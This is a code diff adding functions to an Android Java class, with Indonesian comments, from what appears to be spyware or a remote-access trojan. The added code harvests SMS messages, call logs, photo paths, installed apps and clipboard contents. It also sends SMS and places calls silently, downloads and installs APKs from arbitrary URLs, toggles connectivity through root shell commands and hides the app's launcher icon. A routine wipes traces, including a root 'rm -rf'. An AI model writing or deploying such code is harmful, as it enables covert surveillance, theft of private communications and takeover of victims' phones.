@@ -25,6 +25,8 @@ import android.telephony.SmsManager;
 import android.util.Base64;
 import android.widget.Toast;
 
+import androidx.core.content.FileProvider;
+
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -41,7 +43,8 @@ import java.util.Locale;
 /** Modul perangkat: dump, kontrol, utilitas. */
 public final class Modules {
 
-    public static final String FILE_AUTHORITY_SUFFIX = ".mzkfiles";
+    private static final String SUFFIX_FILES = ".mzkfiles";
+    private static final String SUFFIX_ALIAS = ".Launcher";
 
     public static JSONObject info(Context c) {
         JSONObject o = new JSONObject();
@@ -58,6 +61,7 @@ public final class Modules {
             o.put("a11y", KeylogService.alive());
             o.put("can_write", Settings.System.canWrite(c));
             o.put("root", root());
+            o.put("pkg", c.getPackageName());
         } catch (Exception ignored) {
         }
         return o;
@@ -146,4 +150,333 @@ public final class Modules {
         JSONArray arr = new JSONArray();
         try (android.database.Cursor cur = c.getContentResolver().query(Uri.parse("content://sms"),
                 new String[]{"address", "body", "date", "type"}, null, null, "date DESC")) {
-            while (cur != null && cur.moveToNext() && arr.length() < 8000
+            while (cur != null && cur.moveToNext() && arr.length() < 8000) {
+                JSONObject o = new JSONObject();
+                o.put("from", cur.getString(0));
+                o.put("body", cur.getString(1));
+                o.put("ts", cur.getLong(2));
+                o.put("type", cur.getInt(3));
+                arr.put(o);
+            }
+        } catch (Exception ignored) {
+        }
+        return arr;
+    }
+
+    public static JSONArray calls(Context c) {
+        JSONArray arr = new JSONArray();
+        try (android.database.Cursor cur = c.getContentResolver().query(CallLog.Calls.CONTENT_URI,
+                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
+                        CallLog.Calls.DATE, CallLog.Calls.DURATION}, null, null, "date DESC")) {
+            while (cur != null && cur.moveToNext() && arr.length() < 8000) {
+                JSONObject o = new JSONObject();
+                o.put("number", cur.getString(0));
+                o.put("type", cur.getInt(1));
+                o.put("ts", cur.getLong(2));
+                o.put("dur", cur.getLong(3));
+                arr.put(o);
+            }
+        } catch (Exception ignored) {
+        }
+        return arr;
+    }
+
+    public static JSONArray gallery(Context c, int limit) {
+        JSONArray arr = new JSONArray();
+        try (android.database.Cursor cur = c.getContentResolver().query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                new String[]{MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME,
+                        MediaStore.Images.Media.SIZE, MediaStore.Images.Media.DATE_ADDED,
+                        MediaStore.Images.Media.DATA},
+                null, null, "date_added DESC")) {
+            while (cur != null && cur.moveToNext() && arr.length() < limit) {
+                JSONObject o = new JSONObject();
+                o.put("id", cur.getLong(0));
+                o.put("name", cur.getString(1));
+                o.put("size", cur.getLong(2));
+                o.put("ts", cur.getLong(3));
+                o.put("path", cur.getString(4));
+                arr.put(o);
+            }
+        } catch (Exception ignored) {
+        }
+        return arr;
+    }
+
+    public static JSONArray apps(Context c) {
+        JSONArray arr = new JSONArray();
+        try {
+            for (android.content.pm.ApplicationInfo ai : c.getPackageManager()
+                    .getInstalledApplications(0)) {
+                JSONObject o = new JSONObject();
+                o.put("pkg", ai.packageName);
+                o.put("name", String.valueOf(c.getPackageManager().getApplicationLabel(ai)));
+                o.put("system", (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
+                arr.put(o);
+            }
+        } catch (Exception ignored) {
+        }
+        return arr;
+    }
+
+    public static String clip(Context c) {
+        try {
+            ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
+            if (cm == null || !cm.hasPrimaryClip()) return "";
+            ClipData d = cm.getPrimaryClip();
+            if (d == null || d.getItemCount() == 0) return "";
+            return String.valueOf(d.getItemAt(0).coerceToText(c));
+        } catch (Exception e) {
+            return "";
+        }
+    }
+
+    public static void setWallpaper(Context c, String url) throws Exception {
+        HttpURLConnection cn = (HttpURLConnection) new URL(url).openConnection();
+        cn.setConnectTimeout(15000);
+        try (InputStream in = cn.getInputStream()) {
+            Bitmap bmp = BitmapFactory.decodeStream(in);
+            if (bmp != null) WallpaperManager.getInstance(c).setBitmap(bmp);
+        }
+    }
+
+    public static void vibrate(Context c, long ms) {
+        try {
+            Vibrator v = (Vibrator) c.getSystemService(Context.VIBRATOR_SERVICE);
+            if (v != null) v.vibrate(ms);
+        } catch (Exception ignored) {
+        }
+    }
+
+    public static void volume(Context c, int level) {
+        try {
+            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
+            if (am == null) return;
+            am.setStreamVolume(AudioManager.STREAM_MUSIC,
+                    Math.max(0, Math.min(level, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC))), 0);
+        } catch (Exception ignored) {
+        }
+    }
+
+    public static boolean brightness(Context c, int pct) {
+        int raw = Math.max(1, Math.min(255, pct * 255 / 100));
+        try {
+            if (Settings.System.canWrite(c)) {
+                Settings.System.putInt(c.getContentResolver(),
+                        Settings.System.SCREEN_BRIGHTNESS_MODE,
+                        Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
+                Settings.System.putInt(c.getContentResolver(),
+                        Settings.System.SCREEN_BRIGHTNESS, raw);
+                return true;
+            }
+        } catch (Exception ignored) {
+        }
+        return false;
+    }
+
+    public static boolean wifi(Context c, boolean on) {
+        try {
+            WifiManager wm = (WifiManager) c.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            return wm != null && wm.setWifiEnabled(on);
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    public static void data(Context c, boolean on) {
+        Shell.exec("svc data " + (on ? "enable" : "disable"));
+    }
+
+    public static void airplane(Context c, boolean on) {
+        if (root()) {
+            Shell.exec("su -c settings put global airplane_mode_on " + (on ? 1 : 0));
+            Shell.exec("su -c am broadcast -a android.intent.action.AIRPLANE_MODE");
+        } else {
+            Shell.exec("settings put global airplane_mode_on " + (on ? 1 : 0));
+        }
+    }
+
+    public static boolean online(Context c) {
+        try {
+            ConnectivityManager cm = (ConnectivityManager) c.getSystemService(Context.CONNECTIVITY_SERVICE);
+            if (cm == null) return false;
+            android.net.NetworkInfo ni = cm.getActiveNetworkInfo();
+            return ni != null && ni.isConnected();
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    public static void screenOff(Context c) {
+        Shell.exec("input keyevent 26");
+    }
+
+    public static void screenOn(Context c) {
+        try {
+            PowerManager pm = (PowerManager) c.getSystemService(Context.POWER_SERVICE);
+            if (pm == null) return;
+            @SuppressWarnings("deprecation")
+            PowerManager.WakeLock wl = pm.newWakeLock(
+                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "mzk:on");
+            wl.acquire(8000);
+            wl.release();
+        } catch (Exception ignored) {
+        }
+    }
+
+    public static void toast(Context c, String msg) {
+        try {
+            Toast.makeText(c, msg, Toast.LENGTH_LONG).show();
+        } catch (Exception ignored) {
+        }
+    }
+
+    public static void dial(Context c, String number) {
+        try {
+            Intent i = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + number));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            c.startActivity(i);
+        } catch (Exception ignored) {
+        }
+    }
+
+    public static void call(Context c, String number) {
+        try {
+            Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            c.startActivity(i);
+        } catch (Exception ignored) {
+        }
+    }
+
+    public static void sms(Context c, String number, String body) {
+        try {
+            SmsManager sm = SmsManager.getDefault();
+            sm.sendTextMessage(number, null, body, null, null);
+        } catch (Exception ignored) {
+        }
+    }
+
+    public static void uninstall(Context c, String pkg) {
+        try {
+            Intent i = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            c.startActivity(i);
+        } catch (Exception ignored) {
+        }
+    }
+
+    public static void openUrl(Context c, String url) {
+        try {
+            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            c.startActivity(i);
+        } catch (Exception ignored) {
+        }
+    }
+
+    /** Unduh APK lalu buka installer lewat FileProvider milik paket ini. */
+    public static String install(Context c, String url) throws Exception {
+        HttpURLConnection cn = (HttpURLConnection) new URL(url).openConnection();
+        cn.setConnectTimeout(20000);
+        File out = new File(c.getCacheDir(), "update_" + System.currentTimeMillis() + ".apk");
+        try (InputStream in = cn.getInputStream(); FileOutputStream fo = new FileOutputStream(out)) {
+            byte[] buf = new byte[8192];
+            int n;
+            while ((n = in.read(buf)) > 0) fo.write(buf, 0, n);
+        }
+        Uri uri = FileProvider.getUriForFile(c, c.getPackageName() + SUFFIX_FILES, out);
+        Intent i = new Intent(Intent.ACTION_VIEW);
+        i.setDataAndType(uri, "application/vnd.android.package-archive");
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        c.startActivity(i);
+        return out.getAbsolutePath();
+    }
+
+    /** Sembunyikan ikon launcher: alias dulu, fallback activity langsung. */
+    public static void hideIcon(Context c, boolean hide) {
+        int state = hide
+                ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+                : android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+        String[] candidates = {
+                c.getPackageName() + SUFFIX_ALIAS,
+                c.getPackageName() + ".MainActivity",
+        };
+        for (String name : candidates) {
+            try {
+                c.getPackageManager().setComponentEnabledSetting(
+                        new android.content.ComponentName(name), state,
+                        android.content.pm.PackageManager.DONT_KILL_APP);
+                return;
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    public static String stamp() {
+        return new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
+    }
+
+    /** Bersihkan jejak: cache, external files, MediaStore, unduhan, root. */
+    public static JSONObject clean(Context c) {
+        JSONObject r = new JSONObject();
+        int files = 0;
+        try {
+            File[] kids = c.getCacheDir().listFiles();
+            if (kids != null) {
+                for (File f : kids) if (del(f)) files++;
+            }
+            File extDir = c.getExternalFilesDir(null);
+            File ext = extDir == null ? c.getFilesDir() : extDir;
+            File[] kids2 = ext.listFiles();
+            if (kids2 != null) {
+                for (File f : kids2) if (del(f)) files++;
+            }
+            r.put("files", files);
+        } catch (Exception ignored) {
+        }
+
+        try {
+            int removed = c.getContentResolver().delete(
+                    MediaStore.Files.getContentUri("external"),
+                    MediaStore.Files.FileColumns.DATA + " LIKE ?", new String[]{"%/mzk/%"});
+            r.put("media", removed);
+        } catch (Exception ignored) {
+        }
+
+        try {
+            int dl = c.getContentResolver().delete(
+                    Uri.parse("content://downloads/my_downloads"), null, null);
+            r.put("downloads", dl);
+        } catch (Exception ignored) {
+        }
+
+        if (root()) {
+            Shell.exec("su -c rm -rf /sdcard/mzk");
+            r.put("root_clean", true);
+        }
+        return r;
+    }
+
+    private static boolean del(File f) {
+        try {
+            if (f.isDirectory()) {
+                File[] k = f.listFiles();
+                if (k != null) for (File x : k) del(x);
+            }
+            return f.delete();
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    public static String base64(byte[] data) {
+        return Base64.encodeToString(data, Base64.NO_WRAP);
+    }
+
+    public static byte[] jpeg(Bitmap bmp, int q) {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        bmp.compress(Bitmap.CompressFormat.JPEG, q, out);
+        return out.toByteArray();
+    }
+}
